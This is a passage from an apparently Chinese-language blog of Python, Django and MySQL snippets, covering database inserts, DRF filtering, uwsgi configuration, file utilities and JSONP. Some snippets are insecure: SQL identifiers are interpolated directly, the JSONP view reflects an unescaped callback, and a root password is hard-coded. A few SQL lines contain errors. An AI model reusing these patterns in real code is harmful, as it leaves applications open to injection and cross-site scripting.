#连接数据库</span><br><span class="line">    conn = pymysql.connect(</span><br><span class="line">        host=&#x27;192.168.0.188&#x27;, #数据库所在地址URL</span><br><span class="line">        user=&#x27;root&#x27;, #用户名</span><br><span class="line">        password=&#x27;123456&#x27;, #密码</span><br><span class="line">        database=&#x27;名称&#x27;, #数据库名称</span><br><span class="line">        port=3306,  #端口号</span><br><span class="line">        charset=&#x27;utf8&#x27;</span><br><span class="line">    )</span><br><span class="line">    #拿到查询游标</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    clos,value = zip(*dataDict.items())</span><br><span class="line">    sql = &quot;INSERT INTO `%s`(%s) VALUES (%s)&quot; % (tableName,</span><br><span class="line">                                                &#x27;,&#x27;.join(clos),</span><br><span class="line">                                                &#x27;,&#x27;.join([&#x27;%s&#x27;] * len(value))</span><br><span class="line">                                                )</span><br><span class="line">    print(sql)</span><br><span class="line">    cursor.execute(sql, value)</span><br><span class="line">    conn.commit()</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    print(&#x27;Done&#x27;)</span><br></pre></td></tr></table></figure><h2 id="10-捕捉异常"><a href="#10-捕捉异常" class="headerlink" title="10.捕捉异常"></a>10.捕捉异常</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    pass</span><br><span class="line">except 异常类型 as e:</span><br><span class="line">    pass</span><br><span class="line">finally:</span><br><span class="line">    pass</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">异常类型</span><br><span class="line">Exception  全部异常</span><br><span class="line">AttributeError 试图访问一个对象没有的属性，比如foo.x，但是foo没有属性x</span><br><span class="line">IOError 输入/输出异常；基本上是无法打开文件</span><br><span class="line">ImportError 无法引入模块或包；基本上是路径问题或名称错误</span><br><span class="line">IndentationError 语法错误（的子类） ；代码没有正确对齐</span><br><span class="line">IndexError 下标索引超出序列边界，比如当x只有三个元素，却试图访问x[5]</span><br><span class="line">KeyError 试图访问字典里不存在的键</span><br><span class="line">KeyboardInterrupt Ctrl+C被按下</span><br><span class="line">NameError 使用一个还未被赋予对象的变量</span><br><span class="line">SyntaxError Python代码非法，代码不能编译(个人认为这是语法错误，写错了）</span><br><span class="line">TypeError 传入对象类型与要求的不符合</span><br><span class="line">UnboundLocalError 试图访问一个还未被设置的局部变量，基本上是由于另有一个同名的全局变量，导致你以为正在访问它</span><br><span class="line">ValueError 传入一个调用者不期望的值，即使值的类型是正确的</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="11、获取当前时间"><a href="#11、获取当前时间" class="headerlink" title="11、获取当前时间"></a>11、获取当前时间</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">current_time = str(datetime.datetime.now())[:19]</span><br><span class="line">print(current_time)</span><br><span class="line"></span><br><span class="line">输出格式如：2018-10-20 10:01:43</span><br><span class="line">local_time = time.strftime(&#x27;%Y%m%d%H%M%S&#x27;, time.localtime(time.time()))</span><br><span class="line">print(local_time)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="12、订单编号"><a href="#12、订单编号" class="headerlink" title="12、订单编号"></a>12、订单编号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from random import Random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def random_str(randomlength=8):</span><br><span class="line">    str = &#x27;&#x27;</span><br><span class="line">    chars = &#x27;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&#x27;</span><br><span class="line">    length = len(chars) - 1</span><br><span class="line">    random = Random()</span><br><span class="line">    for i in range(randomlength):</span><br><span class="line">        str+=chars[random.randint(0, length)]</span><br><span class="line">    return str</span><br><span class="line"></span><br><span class="line">def order_num():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    生成付款订单号</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    local_time = time.strftime(&#x27;%Y%m%d%H%M%S&#x27;, time.localtime(time.time()))</span><br><span class="line">    result = local_time + random_str(5)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(order_num())</span><br></pre></td></tr></table></figure><h2 id="13、mysql自动填写当前时间"><a href="#13、mysql自动填写当前时间" class="headerlink" title="13、mysql自动填写当前时间"></a>13、mysql自动填写当前时间</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CURRENT_TIMESTAMP</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190312172747658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">为表添加索引</span><br><span class="line"></span><br><span class="line">ALTER table tableName ADD INDEX indexName(columnName)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="14、drf动态过滤查询"><a href="#14、drf动态过滤查询" class="headerlink" title="14、drf动态过滤查询"></a>14、drf动态过滤查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># page.py</span><br><span class="line"></span><br><span class="line">from rest_framework.pagination import PageNumberPagination</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserPagination(PageNumberPagination):</span><br><span class="line">    &quot;&quot;&quot;用户分页器&quot;&quot;&quot;</span><br><span class="line">    page_size = 10  # 默认的页面数据数量</span><br><span class="line">    page_query_param = &#x27;page&#x27;  # 定制取数据页码key </span><br><span class="line">    page_size_query_param = &#x27;page_size&#x27;  # 默认取数据页码key </span><br><span class="line">    max_page_size = 15   # 数据每页取值的最大上限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># serializers.py</span><br><span class="line"></span><br><span class="line">from rest_framework import serializers</span><br><span class="line"></span><br><span class="line">from user.models import UserInfo</span><br><span class="line"></span><br><span class="line">class UserSerializers(serializers.ModelSerializer):</span><br><span class="line">    &quot;&quot;&quot;用户收货地址&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        model = UserInfo</span><br><span class="line">    # 所有字段</span><br><span class="line">        #fields = &#x27;__all__&#x27;</span><br><span class="line">        fields = [&#x27;name&#x27;, &#x27;code&#x27;, &#x27;title&#x27;,  &#x27;province&#x27;, &#x27;city&#x27;,</span><br><span class="line">                    &#x27;quxian&#x27;, &#x27;address&#x27;, &#x27;code__gte&#x27;, &#x27;code__lte&#x27;]</span><br><span class="line">        # 显示外键</span><br><span class="line">        depth = 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># views.py</span><br><span class="line">class MachineViews(APIView):</span><br><span class="line">    def get(self, request, *args, **kwargs):</span><br><span class="line">        # 从前端获取出来的过滤参数，解析成字典传进filter()函数中</span><br><span class="line">        # 动态过滤，</span><br><span class="line">        kwargs = &#123;&#125;</span><br><span class="line">        # 表中的字段名</span><br><span class="line">        columns = [&#x27;name&#x27;, &#x27;code&#x27;, &#x27;title&#x27;,  &#x27;province&#x27;, &#x27;city&#x27;,</span><br><span class="line">                    &#x27;quxian&#x27;, &#x27;address&#x27;, &#x27;code__gte&#x27;, &#x27;code__lte&#x27;]</span><br><span class="line">        for k, v in request.query_params.items():</span><br><span class="line">            if k not in columns:</span><br><span class="line">                return Response(&#x27;参数不对&#x27;, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line">if v:</span><br><span class="line">            kwargs[k] = v</span><br><span class="line"></span><br><span class="line">        users = UserInfo.objects.filter(**kwargs)</span><br><span class="line">        page = UserPagination()</span><br><span class="line">        page_goods_list = page.paginate_queryset(users, self.request, self)</span><br><span class="line">        ser = UserSerializers(page_goods_list, many=True)</span><br><span class="line">        return page.get_paginated_response(ser.data)</span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="15、linux后台运行python程序"><a href="#15、linux后台运行python程序" class="headerlink" title="15、linux后台运行python程序"></a>15、linux后台运行python程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup /home/project_venv/user/bin/python3 -u /home/user/user_server.py &gt;&gt; /home/user/user.log 2&gt;&amp;1 &amp;   </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="16、追加外键"><a href="#16、追加外键" class="headerlink" title="16、追加外键"></a>16、追加外键</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tb_commentPhoto ADD CONSTRAINT FK_comment_phone</span><br><span class="line">FOREIGN KEY tb_goodsComment(id) REFERENCES tb_commentPhoto(comment_id);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="17、写-x2F-读CSV文件，查看是否存在，若存在就从csv中删除"><a href="#17、写-x2F-读CSV文件，查看是否存在，若存在就从csv中删除" class="headerlink" title="17、写&#x2F;读CSV文件，查看是否存在，若存在就从csv中删除"></a>17、写&#x2F;读CSV文件，查看是否存在，若存在就从csv中删除</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import csv</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_invite_code(random_code_pool=None, length=6, num=10, is_append=False):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    创建随机邀请码,并写入txt文件</span><br><span class="line">    :param: random_code_pool 随机邀请码</span><br><span class="line">    :param: length 邀请码长度</span><br><span class="line">    :param: num 邀请码个数</span><br><span class="line">    :param: is_append True追加,False 覆盖</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    if not random_code_pool:</span><br><span class="line">        code_pool = string.ascii_uppercase + string.digits</span><br><span class="line">        random_code_pool = []</span><br><span class="line">        for i in range(num):</span><br><span class="line">            s = &#x27;&#x27;</span><br><span class="line">            for _ in range(length):</span><br><span class="line">                s += random.choice(code_pool)</span><br><span class="line">            if s and s not in random_code_pool:</span><br><span class="line">                random_code_pool.append(s)</span><br><span class="line"></span><br><span class="line">    # 写入方法。是追加还是覆盖</span><br><span class="line">    write_method = &#x27;a+&#x27; if is_append else &#x27;w&#x27;</span><br><span class="line">    # 写入文件</span><br><span class="line">    with open(&#x27;./invite_code.csv&#x27;, write_method, newline=&#x27;&#x27;) as f:</span><br><span class="line">        writer = csv.writer(f)</span><br><span class="line">        for rowData in random_code_pool:</span><br><span class="line">            # 按行写入</span><br><span class="line">            writer.writerow((rowData,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_invite_code(code):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    查看邀请码是否存在txt文件中，</span><br><span class="line">    若存在就返回True，并在txt文件中删除</span><br><span class="line">    若不存在就返回False</span><br><span class="line">    :param code:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    code_pool = []</span><br><span class="line">    with open(&#x27;./invite_code.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;,errors=&#x27;ignore&#x27;) as f:</span><br><span class="line">        allFileInfo = csv.reader(f)</span><br><span class="line">        for row in allFileInfo:</span><br><span class="line">            code_pool.append(row[0])</span><br><span class="line"></span><br><span class="line">    if code in code_pool:</span><br><span class="line">        # 删除查询的code</span><br><span class="line">        code_pool.pop(code_pool.index(code))</span><br><span class="line"></span><br><span class="line">        # 重新写入文件</span><br><span class="line">        create_invite_code(code_pool,is_append=False)</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # create_invite_code(length=9,num=100)</span><br><span class="line">    print(check_invite_code(&#x27;WJ4PSTJG2&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="18、django中从request获取访问路径"><a href="#18、django中从request获取访问路径" class="headerlink" title="18、django中从request获取访问路径"></a>18、django中从request获取访问路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;获取相对路径&#x27;, request.get_full_path())</span><br><span class="line">print(&#x27;获取绝对路径&#x27;, request.build_absolute_uri())</span><br><span class="line">print(request.build_absolute_uri(&#x27;?&#x27;))</span><br><span class="line">print(request.build_absolute_uri(&#x27;/&#x27;)[:-1].strip(&quot;/&quot;))</span><br><span class="line">print(request.build_absolute_uri(&#x27;/&#x27;).strip(&quot;/&quot;))</span><br><span class="line">print(request.build_absolute_uri(&#x27;/&#x27;))</span><br><span class="line">print(&#x27;----------&#x27;)</span><br><span class="line">print(request.META[&#x27;HTTP_HOST&#x27;])</span><br><span class="line">print(request.META[&#x27;PATH_INFO&#x27;])</span><br><span class="line">print(request.META[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">iphost = request.META.get(&#x27;REMOTE_ADDR&#x27;, &#x27;&#x27;)  # 获取访问来源IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 输出如：</span><br><span class="line">获取相对路径 /QRcode/?d=1</span><br><span class="line">获取绝对路径 http://127.0.0.1:8000/QRcode/?d=1</span><br><span class="line">http://127.0.0.1:8000/QRcode/</span><br><span class="line">http://127.0.0.1:8000</span><br><span class="line">http://127.0.0.1:8000</span><br><span class="line">http://127.0.0.1:8000/</span><br><span class="line">----------</span><br><span class="line">127.0.0.1:8000</span><br><span class="line">/QRcode/</span><br><span class="line">d=1</span><br></pre></td></tr></table></figure><h2 id="19、Django收集静态文件"><a href="#19、Django收集静态文件" class="headerlink" title="19、Django收集静态文件"></a>19、Django收集静态文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先在项目根目录下创建一个static文件夹</span><br><span class="line">然后在settings.py中设置</span><br><span class="line">STATIC_ROOT = os.path.join(BASE_DIR, &#x27;static&#x27;)</span><br><span class="line">最后执行下面的命令：</span><br><span class="line">python manage.py collectstatic</span><br></pre></td></tr></table></figure><h2 id="20、xadmin插件"><a href="#20、xadmin插件" class="headerlink" title="20、xadmin插件"></a>20、xadmin插件</h2><p><a href="https://www.cnblogs.com/lanqie/p/8340215.html">https://www.cnblogs.com/lanqie/p/8340215.html</a></p><h2 id="21、uwsgi自动重启"><a href="#21、uwsgi自动重启" class="headerlink" title="21、uwsgi自动重启"></a>21、uwsgi自动重启</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line"># 使用nginx连接时 使用</span><br><span class="line">socket=0.0.0.0:2019</span><br><span class="line"># 直接作为web服务器使用</span><br><span class="line">#http=0.0.0.1:8000</span><br><span class="line"># 配置工程目录</span><br><span class="line">chdir=/home/user</span><br><span class="line"># 配置项目的wsgi目录。相对于工程目录</span><br><span class="line">wsgi-file=user/wsgi.py</span><br><span class="line">virtualenv=/home/project_venv/user</span><br><span class="line">#配置进程，线程信息</span><br><span class="line">processes=1</span><br><span class="line">threads=1</span><br><span class="line">enable-threads=True</span><br><span class="line">master=True</span><br><span class="line">pidfile=uwsgi.pid</span><br><span class="line">daemonize=uwsgi.log</span><br><span class="line">#启动uwsgi的用户名和用户组</span><br><span class="line">uid=root</span><br><span class="line">gid=root</span><br><span class="line">#uwsgi自动重启</span><br><span class="line">py-autoreload=1</span><br></pre></td></tr></table></figure><h2 id="22、谷歌浏览器快捷键"><a href="#22、谷歌浏览器快捷键" class="headerlink" title="22、谷歌浏览器快捷键"></a>22、谷歌浏览器快捷键</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">浏览器缓存</span><br><span class="line"></span><br><span class="line">Ctrl+Shift+Del  清除Google浏览器缓存的快捷键</span><br><span class="line"></span><br><span class="line">Ctrl+Shift+R  重新加载当前网页而不使用缓存内容</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="23、git克隆分支"><a href="#23、git克隆分支" class="headerlink" title="23、git克隆分支"></a>23、git克隆分支</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b dev 地址 </span><br></pre></td></tr></table></figure><h2 id="24、mysql更新语句、新增列、删除列"><a href="#24、mysql更新语句、新增列、删除列" class="headerlink" title="24、mysql更新语句、新增列、删除列"></a>24、mysql更新语句、新增列、删除列</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">update user set name=&#x27;张三&#x27; where id=111</span><br><span class="line"># 删除</span><br><span class="line">DELETE FROM table_name [WHERE Clause]</span><br><span class="line"></span><br><span class="line"># 增加字段</span><br><span class="line">alter table 表名 add column 列名 类型;</span><br><span class="line"># 删除字段</span><br><span class="line">alter table 表名 dropcolumn 列名 ;</span><br></pre></td></tr></table></figure><h2 id="25、删除指定格式的文件"><a href="#25、删除指定格式的文件" class="headerlink" title="25、删除指定格式的文件"></a>25、删除指定格式的文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove_specified_format_file(file_dir, format_name):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    删除指定格式的文件</span><br><span class="line">    :param file_dir: 文件根目录</span><br><span class="line">    :param format_name: 格式</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for root, dirs, files in os.walk(file_dir):</span><br><span class="line">        # print(root) #当前目录路径</span><br><span class="line">        # print(dirs) #当前路径下所有子目录</span><br><span class="line">        # print(files) #当前路径下所有非目录子文件</span><br><span class="line">        for file in files:</span><br><span class="line">            if re.match(format_name, file):</span><br><span class="line">                print(os.path.join(root, file))</span><br><span class="line">                os.remove(os.path.join(root, file))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">remove_specified_format_file(r&#x27;D:\学习\LDC\java&#x27;, r&#x27;\._*&#x27;)</span><br></pre></td></tr></table></figure><h2 id="26、计算文件总数"><a href="#26、计算文件总数" class="headerlink" title="26、计算文件总数"></a>26、计算文件总数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def file_count(file_dir):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    </span><br><span class="line">    :param file_dir: 文件根目录</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    count = 0</span><br><span class="line">    for root, dirs, files in os.walk(file_dir):</span><br><span class="line">        # print(root) #当前目录路径</span><br><span class="line">        # print(dirs) #当前路径下所有子目录</span><br><span class="line">        # print(files) #当前路径下所有非目录子文件</span><br><span class="line">        count += len(files)</span><br><span class="line">    return count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(file_count(r&#x27;D:\学习\LDC\java\Java学习\newEstore\estore\js&#x27;))</span><br></pre></td></tr></table></figure><h2 id="27、计算文件夹大小"><a href="#27、计算文件夹大小" class="headerlink" title="27、计算文件夹大小"></a>27、计算文件夹大小</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">def file_size(file_dir):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    删除指定格式的文件</span><br><span class="line">    :param file_dir: 文件根目录</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    size = 0</span><br><span class="line">    for root, dirs, files in os.walk(file_dir):</span><br><span class="line">        # print(root) #当前目录路径</span><br><span class="line">        # print(dirs) #当前路径下所有子目录</span><br><span class="line">        # print(files) #当前路径下所有非目录子文件</span><br><span class="line">        for file in files:</span><br><span class="line">            size += os.path.getsize(os.path.join(root, file))</span><br><span class="line"># M为单位</span><br><span class="line">    return size / 1024 / 1024</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_name = r&#x27;D:\学习&#x27;</span><br><span class="line">print(file_size(file_name))</span><br></pre></td></tr></table></figure><h2 id="28、Django实现jsonp跨域"><a href="#28、Django实现jsonp跨域" class="headerlink" title="28、Django实现jsonp跨域"></a>28、Django实现jsonp跨域</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># html</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">                    url: &#x27;请求路由&#x27;,</span><br><span class="line">                    type: &#x27;GET&#x27;,</span><br><span class="line">                    dataType: &#x27;JSONP&#x27;,</span><br><span class="line">                    data:&#123;</span><br><span class="line">                      code: &#x27;yes&#x27;,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    jsonp: &#x27;callback&#x27;,</span><br><span class="line">                    success: function(res) &#123;</span><br><span class="line">                       var selectData = $.parseJSON(res);</span><br><span class="line">                       alert(selectData);</span><br><span class="line">                    &#125;,</span><br><span class="line">                    error: function(err) &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line"># views.py</span><br><span class="line">def get(self, request, *args, **kwargs):</span><br><span class="line">        code = request.GET.get(&#x27;code&#x27;, &#x27;&#x27;)</span><br><span class="line">        # 跨域请求</span><br><span class="line">        callback = request.GET.get(&#x27;callback&#x27;, &#x27;&#x27;)</span><br><span class="line">        return HttpResponse(&quot;%s(&#x27;%s&#x27;)&quot; % (callback, json.dumps(&#123;&#x27;code&#x27;: code&#125;)), status=status.HTTP_200_OK)</span><br><span class="line">                    </span><br><span class="line">cors解决跨域</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/wxiaoyu/p/9578848.html</span><br></pre></td></tr></table></figure><h2 id="29、微信获取用户信息"><a href="#29、微信获取用户信息" class="headerlink" title="29、微信获取用户信息"></a>29、微信获取用户信息</h2><p>参考：<a href="https://blog.csdn.net/weixin_39735923/article/details/79202563">https://blog.csdn.net/weixin_39735923/article/details/79202563</a></p><h2 